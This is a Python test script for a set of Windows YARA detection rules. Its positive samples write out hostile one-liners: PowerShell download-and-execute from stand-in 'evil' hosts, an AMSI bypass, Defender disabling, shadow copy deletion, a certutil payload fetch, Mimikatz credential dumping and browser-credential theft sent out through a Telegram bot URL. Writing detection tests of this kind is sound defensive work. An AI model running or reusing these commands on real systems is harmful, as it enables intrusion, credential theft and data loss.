#!/usr/bin/env python3
"""Checks the bundled YARA rules: they compile without warnings, catch what they are meant to
catch, and stay quiet on everyday look-alikes.   pip install yara-python && python3 test_rules.py"""
import struct
import sys
from pathlib import Path

import yara

RULES = Path(__file__).with_name("agamemnon-windows.yar")

LNK = struct.pack("<II", 0x4C, 0x00021401) + b"\0" * 60 + "powershell -enc AAAA http://x".encode("utf-16-le")

SHOULD_MATCH = {
    "Agamemnon_EICAR_Test_File": rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
    "Agamemnon_PowerShell_Download_And_Execute": b"IEX (New-Object Net.WebClient).DownloadString('http://evil/x.ps1')",
    "Agamemnon_PowerShell_Hidden_Encoded_Command": b"powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBi",
    "Agamemnon_PowerShell_Shellcode_Runner": b'Add-Type -TypeDefinition $code; [DllImport("kernel32")] VirtualAlloc CreateThread',
    "Agamemnon_AMSI_Bypass": b"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')",
    "Agamemnon_Defender_Tampering": b"Set-MpPreference -DisableRealtimeMonitoring $true",
    "Agamemnon_Shadow_Copy_Deletion": b"cmd.exe /c vssadmin.exe Delete Shadows /All /Quiet",
    "Agamemnon_Browser_Credential_Stealer": b"MZ" + b"\0" * 100
        + b"\\User Data\\Default\\Login Data \\User Data\\Local State encrypted_key https://api.telegram.org/bot1/sendDocument",
    "Agamemnon_Mimikatz": b"mimikatz # privilege::debug sekurlsa::logonpasswords gentilkiwi",
    "Agamemnon_Script_Downloader": b'CreateObject("MSXML2.XMLHTTP") CreateObject("ADODB.Stream") CreateObject("WScript.Shell").Run "a.exe"',
    "Agamemnon_Shortcut_Launching_Interpreter": LNK,
    "Agamemnon_HTA_Executes_Code": b'<HTA:APPLICATION id=x><script>new ActiveXObject("WScript.Shell").Run("powershell -c calc")</script>',
    "Agamemnon_Office_Remote_Template": b'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
        b'Target="https://evil.example/t.dotm" TargetMode="External"',
    "Agamemnon_LOLBin_Payload_Fetch": b"certutil.exe -urlcache -split -f http://evil/a.exe a.exe",
}

SHOULD_NOT_MATCH = [
    b"Write-Host 'Hello'; Get-ChildItem C:\\ | Sort-Object Length",
    b"Invoke-WebRequest https://example.com -OutFile x.zip",
    b"Get-MpPreference | Select ExclusionPath",
    b"vssadmin list shadows",
    b"This document explains how IEX works in general.",
    b'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
    b'Target="file:///C:/Templates/Normal.dotm" TargetMode="External"',
]


def main() -> int:
    rules = yara.compile(filepath=str(RULES), error_on_warning=True)
    failures = []
    for rule, sample in SHOULD_MATCH.items():
        matched = {m.rule for m in rules.match(data=sample)}
        if rule not in matched:
            failures.append(f"{rule} did not match its sample (got {sorted(matched)})")
    for sample in SHOULD_NOT_MATCH:
        if matched := [m.rule for m in rules.match(data=sample)]:
            failures.append(f"false positive {matched} on {sample[:60]!r}")
    for failure in failures:
        print("FAIL:", failure)
    print(f"{len(SHOULD_MATCH)} positive and {len(SHOULD_NOT_MATCH)} negative samples, {len(failures)} failure(s)")
    return 1 if failures else 0


if __name__ == "__main__":
    sys.exit(main())
